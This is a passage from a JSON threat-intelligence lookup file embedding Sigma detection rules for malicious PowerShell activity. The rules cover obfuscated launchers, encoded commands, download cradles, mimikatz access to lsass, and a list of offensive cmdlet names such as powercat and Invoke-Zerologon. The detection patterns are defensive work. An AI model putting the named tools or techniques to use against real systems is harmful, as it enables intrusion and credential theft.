Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n  type: derived\n- id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - ProcessCreation\n",
                            "sigma:id": "02030f2f-6199-49ec-b258-ea71b07e03dc",
                            "title": "Malicious PowerShell Commandlets - ProcessCreation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b222df08-0e07-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Clip.exe to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated use of Clip.exe to execute PowerShell\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - /c\n    - /r\n    CommandLine|contains|all:\n    - cmd\n    - '&&'\n    - 'clipboard]::'\n    - -f\nfalsepositives:\n- Unknown\nid: b222df08-0e07-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/17\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation CLIP+ Launcher\n",
                            "sigma:id": "b222df08-0e07-11eb-adc1-0242ac120002",
                            "title": "Invoke-Obfuscation CLIP+ Launcher",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ac20ae82-8758-4f38-958e-b44a3140ca88",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use MSHTA in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/08\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - set\n    - '&&'\n    - mshta\n    - vbscript:createobject\n    - .run\n    - (window.close)\nfalsepositives:\n- Unknown\nid: ac20ae82-8758-4f38-958e-b44a3140ca88\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/08\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use MSHTA\n",
                            "sigma:id": "ac20ae82-8758-4f38-958e-b44a3140ca88",
                            "title": "Invoke-Obfuscation Via Use MSHTA",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
                        "lookup_data": {
                            "description": "UNC3524: Eye Spy on Your Email",
                            "link": "http://www.botvrij.eu/data/feed-osint/25adc94b-5b29-44fe-a4a8-c89d17ff3566.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1652459344",
                            "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ca2092a1-c273-4878-9b4b-0d60115bf5ea",
                        "lookup_data": {
                            "description": "Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)",
                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  Anton Kutepov, oscd.community\ndate: 2018/09/03\ndescription: Detects suspicious powershell process starts with base64 encoded commands\n  (e.g. Emotet)\ndetection:\n  condition: ((selection and selection2) or (selection and selection2 and selection3)\n    or (selection and selection4) or selection5) and not falsepositive1\n  falsepositive1:\n    CommandLine|contains|all:\n    - ' -ExecutionPolicy'\n    - 'remotesigned '\n  selection:\n    CommandLine|contains: ' -e'\n  selection2:\n    CommandLine|contains: ' JAB'\n  selection3:\n    CommandLine|contains|all:\n    - ' -w'\n    - ' hidden '\n  selection4:\n    CommandLine|contains:\n    - ' BA^J'\n    - ' SUVYI'\n    - ' SQBFAFgA'\n    - ' aQBlAHgA'\n    - ' aWV4I'\n    - ' IAA'\n    - ' IAB'\n    - ' UwB'\n    - ' cwB'\n  selection5:\n    CommandLine|contains: '.exe -ENCOD '\nid: ca2092a1-c273-4878-9b4b-0d60115bf5ea\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/03/02\nreferences:\n- https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious Encoded PowerShell Command Line\n",
                            "sigma:id": "ca2092a1-c273-4878-9b4b-0d60115bf5ea",
                            "title": "Suspicious Encoded PowerShell Command Line",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1ac8666b-046f-4201-8aba-1951aaec03a3",
                        "lookup_data": {
                            "description": "Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)",
                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019/01/16\ndescription: Detects a suspicious command line execution that includes an URL and\n  AppData string in the command line parameters as used by several droppers (js/vbs\n  > powershell)\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - http\n    - ://\n    - '%AppData%'\n    Image|endswith: \\cmd.exe\nfalsepositives:\n- High\nfields:\n- CommandLine\n- ParentCommandLine\nid: 1ac8666b-046f-4201-8aba-1951aaec03a3\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100\n- https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.003\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1105\ntitle: Command Line Execution with Suspicious URL and AppData Strings\n",
                            "sigma:id": "1ac8666b-046f-4201-8aba-1951aaec03a3",
                            "title": "Command Line Execution with Suspicious URL and AppData Strings",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "aa35a627-33fb-4d04-a165-d33b4afca3e8",
                        "lookup_data": {
                            "description": "Detects usage of mimikatz through WinRM protocol by monitoring access to lsass process by wsmprovhost.exe.",
                            "raw": "author: Patryk Prauze - ING Tech\ndate: 2019/05/20\ndescription: Detects usage of mimikatz through WinRM protocol by monitoring access\n  to lsass process by wsmprovhost.exe.\ndetection:\n  condition: selection and not filter\n  filter:\n    GrantedAccess: '0x80000000'\n  selection:\n    SourceImage: C:\\Windows\\system32\\wsmprovhost.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unlikely\nid: aa35a627-33fb-4d04-a165-d33b4afca3e8\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2021/06/21\nreferences:\n- https://pentestlab.blog/2018/05/15/lateral-movement-winrm/\nstatus: stable\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1059.001\n- attack.lateral_movement\n- attack.t1021.006\n- attack.s0002\ntitle: Mimikatz through Windows Remote Management\n",
                            "sigma:id": "aa35a627-33fb-4d04-a165-d33b4afca3e8",
                            "title": "Mimikatz through Windows Remote Management",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "07ad2ea8-6a55-4ac6-bf3e-91b8e59676eb",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use MSHTA in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/08\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\ndetection:\n  condition: selection\n  selection:\n    Payload|contains|all:\n    - set\n    - '&&'\n    - mshta\n    - vbscript:createobject\n    - .run\n    - (window.close)\nfalsepositives:\n- Unknown\nid: 07ad2ea8-6a55-4ac6-bf3e-91b8e59676eb\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/04\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: e55a5195-4724-480e-a77e-3ebe64bd3759\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use MSHTA - PowerShell Module\n",
                            "sigma:id": "07ad2ea8-6a55-4ac6-bf3e-91b8e59676eb",
                            "title": "Invoke-Obfuscation Via Use MSHTA - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8d31a8ce-46b5-4dd6-bdc3-680931f1db86",
                        "lookup_data": {
                            "description": "focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including\nCobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads \nthat often undergo minimal changes by attackers due to bad opsec.\n",
                            "raw": "author: ok @securonix invrep_de, oscd.community\ndate: 2020/10/09\ndescription: \"focuses on trivial artifacts observed in variants of prevalent offensive\\\n  \\ ps1 payloads, including\\nCobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire,\\\n  \\ Powersploit, and other attack payloads \\nthat often undergo minimal changes by\\\n  \\ attackers due to bad opsec.\\n\"\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|contains:\n    - $DoIt\n    - harmj0y\n    - mattifestation\n    - _RastaMouse\n    - tifkin_\n    - '0xdeadbeef'\nfalsepositives:\n- Moderate-to-low; Despite the shorter length/lower entropy for some of these, because\n  of high specificity, fp appears to be fairly limited in many environments.\nid: 8d31a8ce-46b5-4dd6-bdc3-680931f1db86\nlevel: critical\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/\n- https://labs.sentinelone.com/top-tier-russian-organized-cybercrime-group-unveils-fileless-stealthy-powertrick-backdoor-for-high-value-targets/\n- https://www.mdeditor.tw/pl/pgRt\nrelated:\n- id: 73e733cc-1ace-3212-a107-ff2523cc9fc3\n  type: derived\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Bad Opsec Powershell Code Artifacts\n",
                            "sigma:id": "8d31a8ce-46b5-4dd6-bdc3-680931f1db86",
                            "title": "Bad Opsec Powershell Code Artifacts",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6f8b3439-a203-45dc-a88b-abf57ea15ccf",
                        "lookup_data": {
                            "description": "The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule.",
                            "raw": "author: Thomas Patzke\ndate: 2020/05/22\ndescription: The CrachMapExec pentesting framework implements a PowerShell obfuscation\n  with some static strings detected by this rule.\ndetection:\n  condition: powershell_execution and snippets\n  powershell_execution:\n    CommandLine|contains:\n    - powershell.exe\n    - pwsh.exe\n  snippets:\n    CommandLine|contains:\n    - join*split\n    - ( $ShellId[1]+$ShellId[13]+'x')\n    - ( $PSHome[*]+$PSHOME[*]+\n    - ( $env:Public[13]+$env:Public[5]+'x')\n    - ( $env:ComSpec[4,*,25]-Join'')\n    - '[1,3]+''x''-Join'''')'\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- CommandLine\nid: 6f8b3439-a203-45dc-a88b-abf57ea15ccf\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/byt3bl33d3r/CrackMapExec\n- https://github.com/byt3bl33d3r/CrackMapExec/blob/0a49f75347b625e81ee6aa8c33d3970b5515ea9e/cme/helpers/powershell.py#L242\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1027.005\ntitle: CrackMapExec PowerShell Obfuscation\n",
                            "sigma:id": "6f8b3439-a203-45dc-a88b-abf57ea15ccf",
                            "title": "CrackMapExec PowerShell Obfuscation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
                        "lookup_data": {
                            "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/08/28\ndescription: Detects the execution of powershell, a WebClient object creation and\n  the invocation of DownloadFile in a single command line\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - powershell\n    - .DownloadFile\n    - System.Net.WebClient\nfalsepositives:\n- Unknown\nid: 8f70ac5f-1f6f-4f8e-b454-db19561216c5\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1104\n- attack.t1105\ntitle: PowerShell DownloadFile\n",
                            "sigma:id": "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
                            "title": "PowerShell DownloadFile",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b3512211-c67e-4707-bedc-66efc7848863",
                        "lookup_data": {
                            "description": "Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0",
                            "raw": "author: Harish Segar (rule)\ndate: 2020/03/20\ndescription: Detects PowerShell downgrade attack by comparing the host versions with\n  the actually used engine version 2.0\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -version 2 '\n    - ' -versio 2 '\n    - ' -versi 2 '\n    - ' -vers 2 '\n    - ' -ver 2 '\n    - ' -ve 2 '\n    - ' -v 2 '\n    Image|endswith: \\powershell.exe\nfalsepositives:\n- Unknown\nid: b3512211-c67e-4707-bedc-66efc7848863\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/04\nreferences:\n- http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n- https://github.com/r00t-3xp10it/hacking-material-books/blob/43cb1e1932c16ff1f58b755bc9ab6b096046853f/obfuscation/simple_obfuscation.md#bypass-or-avoid-amsi-by-version-downgrade-\nrelated:\n- id: 6331d09b-4785-4c13-980f-f96661356249\n  type: derived\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1059.001\ntitle: Potential PowerShell Downgrade Attack\n",
                            "sigma:id": "b3512211-c67e-4707-bedc-66efc7848863",
                            "title": "Potential PowerShell Downgrade Attack",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "74ad4314-482e-4c3e-b237-3f7ed3b9ca8d",
                        "lookup_data": {
                            "description": "Detects activity mentioned in Operation Wocao report",
                            "raw": "author: Florian Roth (Nextron Systems), frack113\ndate: 2019/12/20\ndescription: Detects activity mentioned in Operation Wocao report\ndetection:\n  condition: selection\n  selection:\n    CallerProcessName|endswith: \\checkadmin.exe\n    EventID: 4799\n    TargetUserName|startswith: Administr\nfalsepositives:\n- Administrators that use checkadmin.exe tool to enumerate local administrators\nid: 74ad4314-482e-4c3e-b237-3f7ed3b9ca8d\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/11/27\nreferences:\n- https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/\n- https://twitter.com/SBousseaden/status/1207671369963646976\nstatus: test\ntags:\n- attack.discovery\n- attack.t1012\n- attack.defense_evasion\n- attack.t1036.004\n- attack.t1027\n- attack.execution\n- attack.t1053.005\n- attack.t1059.001\ntitle: Operation Wocao Activity - Security\n",
                            "sigma:id": "74ad4314-482e-4c3e-b237-3f7ed3b9ca8d",
                            "title": "Operation Wocao Activity - Security",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b66474aa-bd92-4333-a16c-298155b120df",
                        "lookup_data": {
                            "description": "Detects suspicious powershell execution that ends with a common flag instead of a command or a filename to execute (could be a sign of implicit execution that uses files in WindowsApps directory)",
                            "raw": "author: pH-T (Nextron Systems), Florian Roth\ndate: 2022/04/08\ndescription: Detects suspicious powershell execution that ends with a common flag\n  instead of a command or a filename to execute (could be a sign of implicit execution\n  that uses files in WindowsApps directory)\ndetection:\n  condition: selection\n  selection:\n    CommandLine|endswith:\n    - ' -windowstyle hidden\"'\n    - ' -windowstyle hidden'\n    - ' -windowstyle hidden'''\n    - ' -w hidden\"'\n    - ' -w hidden'\n    - ' -w hidden'''\n    - ' -ep bypass\"'\n    - ' -ep bypass'\n    - ' -ep bypass'''\n    - ' -noni\"'\n    - ' -noni'\n    - ' -noni'''\nfalsepositives:\n- Unknown\nid: b66474aa-bd92-4333-a16c-298155b120df\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\nstatus: experimental\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1053.005\n- attack.t1059.001\ntitle: Suspicious Powershell No File or Command\n",
                            "sigma:id": "b66474aa-bd92-4333-a16c-298155b120df",
                            "title": "Suspicious Powershell No File or Command",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "21f9162c-5f5d-4b01-89a8-b705bd7d10ab",
                        "lookup_data": {
                            "description": "Detects powershell scripts that import modules from suspicious directories",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/07\ndescription: Detects powershell scripts that import modules from suspicious directories\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - Import-Module \"$Env:Temp\\\n    - Import-Module '$Env:Temp\\\n    - Import-Module $Env:Temp\\\n    - Import-Module \"$Env:Appdata\\\n    - Import-Module '$Env:Appdata\\\n    - Import-Module $Env:Appdata\\\n    - Import-Module C:\\Users\\Public\\\n    - ipmo \"$Env:Temp\\\n    - ipmo '$Env:Temp\\\n    - ipmo $Env:Temp\\\n    - ipmo \"$Env:Appdata\\\n    - ipmo '$Env:Appdata\\\n    - ipmo $Env:Appdata\\\n    - ipmo C:\\Users\\Public\\\nfalsepositives:\n- Unknown\nid: 21f9162c-5f5d-4b01-89a8-b705bd7d10ab\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/10\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md\nrelated:\n- id: c31364f7-8be6-4b77-8483-dd2b5a7b69a3\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Import PowerShell Modules From Suspicious Directories\n",
                            "sigma:id": "21f9162c-5f5d-4b01-89a8-b705bd7d10ab",
                            "title": "Import PowerShell Modules From Suspicious Directories",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9ac8b09b-45de-4a07-9da1-0de8c09304a3",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of stdin to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of stdin to execute PowerShell\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|re: .*cmd.{0,5}(?:/c|/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\"\nfalsepositives:\n- Unknown\nid: 9ac8b09b-45de-4a07-9da1-0de8c09304a3\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 779c8c12-0eb1-11eb-adc1-0242ac120002\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation STDIN+ Launcher - PowerShell Module\n",
                            "sigma:id": "9ac8b09b-45de-4a07-9da1-0de8c09304a3",
                            "title": "Invoke-Obfuscation STDIN+ Launcher - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e55a5195-4724-480e-a77e-3ebe64bd3759",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use MSHTA in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/08\ndescription: Detects Obfuscated Powershell via use MSHTA in Scripts\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|contains|all:\n    - set\n    - '&&'\n    - mshta\n    - vbscript:createobject\n    - .run\n    - (window.close)\nfalsepositives:\n- Unknown\nid: e55a5195-4724-480e-a77e-3ebe64bd3759\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use MSHTA - PowerShell\n",
                            "sigma:id": "e55a5195-4724-480e-a77e-3ebe64bd3759",
                            "title": "Invoke-Obfuscation Via Use MSHTA - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "95eadcb2-92e4-4ed1-9031-92547773a6db",
                        "lookup_data": {
                            "description": "Detects suspicious powershell invocations from interpreters or unusual programs",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/01/16\ndescription: Detects suspicious powershell invocations from interpreters or unusual\n  programs\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_health_service:\n    CurrentDirectory|contains: \\Health Service State\\\n  selection:\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    ParentImage|endswith:\n    - \\wscript.exe\n    - \\cscript.exe\nfalsepositives:\n- Microsoft Operations Manager (MOM)\n- Other scripts\nid: 95eadcb2-92e4-4ed1-9031-92547773a6db\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://www.securitynewspaper.com/2017/03/20/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Invocation From Script Engines\n",
                            "sigma:id": "95eadcb2-92e4-4ed1-9031-92547773a6db",
                            "title": "Suspicious PowerShell Invocation From Script Engines",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "0adfbc14-0ed1-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Environment Variables to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of Environment Variables to execute PowerShell\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|re: .*cmd.{0,5}(?:/c|/r)(?:\\s|)\"set\\s[a-zA-Z]{3,6}.*(?:\\{\\d\\}){1,}\\\\\"\\s+?-f(?:.*\\)){1,}.*\"\nfalsepositives:\n- Unknown\nid: 0adfbc14-0ed1-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR+ Launcher - PowerShell\n",
                            "sigma:id": "0adfbc14-0ed1-11eb-adc1-0242ac120002",
                            "title": "Invoke-Obfuscation VAR+ Launcher - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "243de76f-4725-4f2e-8225-a8a69b15ad61",
                        "lookup_data": {
                            "description": "Detects creation of a local user via PowerShell",
                            "raw": "author: '@ROxPinTeddy'\ndate: 2020/04/11\ndescription: Detects creation of a local user via PowerShell\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: New-LocalUser\nfalsepositives:\n- Legitimate user creation\nid: 243de76f-4725-4f2e-8225-a8a69b15ad61\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1136.001/T1136.001.md\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.persistence\n- attack.t1136.001\ntitle: PowerShell Create Local User\n",
                            "sigma:id": "243de76f-4725-4f2e-8225-a8a69b15ad61",
                            "title": "PowerShell Create Local User",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1139d2e2-84b1-4226-b445-354492eba8ba",
                        "lookup_data": {
                            "description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs",
                            "raw": "author: James Pemberton / @4A616D6573\ndate: 2019/10/24\ndescription: Detects the use of various web request commands with commandline tools\n  and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs\ndetection:\n  condition: selection and not filter\n  filter:\n    Path|startswith: C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\n  selection:\n    ScriptBlockText|contains:\n    - Invoke-WebRequest\n    - 'iwr '\n    - 'wget '\n    - 'curl '\n    - Net.WebClient\n    - Start-BitsTransfer\n    - Resume-BitsTransfer\n    - '[System.Net.WebRequest]::create'\n    - Invoke-RestMethod\n    - WinHttp.WinHttpRequest\nfalsepositives:\n- Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nid: 1139d2e2-84b1-4226-b445-354492eba8ba\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/10\nreferences:\n- https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n- https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\nrelated:\n- id: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\n  type: derived\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Usage Of Web Request Commands And Cmdlets - ScriptBlock\n",
                            "sigma:id": "1139d2e2-84b1-4226-b445-354492eba8ba",
                            "title": "Usage Of Web Request Commands And Cmdlets - ScriptBlock",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "692f0bec-83ba-4d04-af7e-e884a96059b6",
                        "lookup_data": {
                            "description": "Detects Powershell as a child of the WmiPrvSE process. Which could be a signe of remote access via WMI",
